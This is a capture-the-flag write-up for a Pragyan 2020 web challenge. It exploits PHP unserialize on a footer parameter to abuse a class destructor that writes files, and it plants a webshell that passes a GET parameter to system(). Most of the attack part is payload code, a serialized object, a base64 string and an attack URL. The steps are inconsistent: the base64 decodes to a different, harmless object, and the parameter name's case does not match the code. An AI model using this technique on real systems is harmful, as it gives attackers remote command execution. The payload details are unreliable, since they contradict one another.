

#### Solved?

Yes

#### Tried:

After reading the source code we came to the conclusion that the vulnerable piece of the puzzle was *unserialize*.

```
function setFooter(){
  if(isset($_GET['newFooter'])){
    $newFooter=unserialize(base64_decode($_GET["newFooter"]));
    echo '<div class="footer">'.$newFooter.'</div>';
  }
  else{
    echo '<div class="footer">Pragyan 2020!</div>';
  }
}
```

As per my understanding after reading few blogs about PHP unserialization vulnerabilites I found out that magic methods such as __construct
and __destruct are called automatically without call the function itself.

So, we needed an object to exploit it (Just like as in ROP we need gadgets) and we noticed that in *pageContent* class our magic methods were defined.

```
class pageContent{
  private $file_name;
  private $newContent;

  function __construct() 
  { 
    $this->file_name="txt/content.txt"; 
    $file = file_get_contents($this->file_name);
    $this->newContent=$file;
  } 

  function setContent($newContent){
    $this->newContent=$newContent;
  }

  function __destruct() 
  { 
    $fd=fopen($this->file_name,"w");
    fwrite($fd,$this->newContent);
    fclose($fd);
  } 
}
```

As our input is already in the unserialized method we won't need to use __construct and will use __destruct instead. But for understanding 
purpose all __construct does is reading file content at `txt/content.txt`.

So it narrowed down our possible soultion to __destruction method which just writes our data to any file we specify without sanitizing user
input ofcourse.

We needed to create our exploit as such it will call *pageContent* class with our argument i.e filename and it's content.

Following is the snippet we used to create serialized object for the class and it's argument, kai.php as the filename and php webshell as the 
content.

```
<?php

class pageContent{
  public $file_name = 'txt/kai.php';
  public $newContent = "<?php system('ls -la')?>";

}

$obj = new pageContent;

echo htmlspecialchars(serialize($obj));

?>
```

#### Object: 

```O:11:"pageContent":2:{s:9:"file_name";s:11:"txt/kai.php";s:10:"newContent";s:29:"<?php system($_GET['kai']);?>";}```

#### Base64: 

```TzoxMToicGFnZUNvbnRlbnQiOjI6e3M6OToiZmlsZV9uYW1lIjtzOjEyOiJ0eHQvYW1hbi50eHQiO3M6MTA6Im5ld0NvbnRlbnQiO3M6NToidGVzdDEiO30=```

#### Webshell:

In order to call unserialize function we had to pass ```newFooter``` GET parameter and our payload as it's value.

```http://ctf.pragyan.org:9000/?newfooter=TzoxMToicGFnZUNvbnRlbnQiOjI6e3M6OToiZmlsZV9uYW1lIjtzOjEyOiJ0eHQvYW1hbi50eHQiO3M6MTA6Im5ld0NvbnRlbnQiO3M6NToidGVzdDEiO30=```

And we got our shell at ```http://ctf.pragyan.org:9000/txt/kai.php```

**Team UnderDawgs**
